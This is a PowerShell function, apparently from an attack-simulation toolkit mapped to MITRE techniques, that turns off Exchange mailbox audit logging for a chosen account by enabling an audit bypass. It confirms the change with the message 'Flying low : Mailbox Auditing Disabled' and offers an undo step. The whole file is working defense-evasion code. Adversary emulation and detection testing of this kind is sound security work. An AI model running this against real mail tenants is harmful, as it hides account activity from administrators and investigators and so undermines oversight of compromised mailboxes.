function DisableMailboxAuditing{

    mitre_details("DisableMailboxAuditing")
    
    EnterAccount("`n[?] Enter account to disable auditing for")

    #Enter account to compromise
    $target_account = $global:account_username

    MAADWriteProcess "Fetching mailbox current config"
    $current_config = Get-MailboxAuditBypassAssociation -Identity $target_account
    MAADWriteProcess "Current Config -> Mailbox Audit Bypass Enabled : $($current_config.AuditBypassEnabled)"

    $user_confirm = Read-Host -Prompt "`n[?] Confirm audit log disable for this account (y/n)"
    Write-Host ""

    if ($user_confirm -notin "No","no","N","n") {
        try {
            MAADWriteProcess "Disabling mailbox auditing for account -> $target_account"
            Set-MailboxAuditBypassAssociation -Identity $target_account -AuditByPassEnabled $true -ErrorAction Stop | Out-Null
            MAADWriteProcess "Waiting for changes to take effect"
            Start-Sleep -s 60
            $updated_config = Get-MailboxAuditBypassAssociation -Identity $target_account
            MAADWriteProcess "Updated Config -> Mailbox Audit Bypass Enabled : $($updated_config.AuditBypassEnabled)"
            MAADWriteSuccess "Flying low : Mailbox Auditing Disabled"
            $allow_undo = $true
        }
        catch {
            MAADWriteError "Failed to bypass audit logging for account"
        }      
    }

    #Undo changes
    if ($allow_undo -eq $true) {
        $user_confirm = Read-Host -Prompt "`n[?] Undo: Re-enable audit logging for the account (y/n)"
        Write-Host ""

        if ($user_confirm -notin "No","no","N","n") {
            try {
                MAADWriteProcess "Re-enabling mailbox audit logging for account -> $target_account"
                Set-MailboxAuditBypassAssociation -Identity $target_account -AuditByPassEnabled $false | Out-Null
                MAADWriteProcess "Waiting for changes to take effect"
                Start-Sleep -s 60    
                $updated_config = Get-MailboxAuditBypassAssociation -Identity $target_account
                MAADWriteProcess "Fetching mailbox updated config"
                MAADWriteProcess "Updated Config -> Mailbox Audit Bypass Enabled : $($updated_config.AuditBypassEnabled)"
                MAADWriteSuccess "Re-enabled Audit Logging"
            }
            catch {
                MAADWriteError "Failed to re-enable audit logging"
            }
        }
    }
    MAADPause
}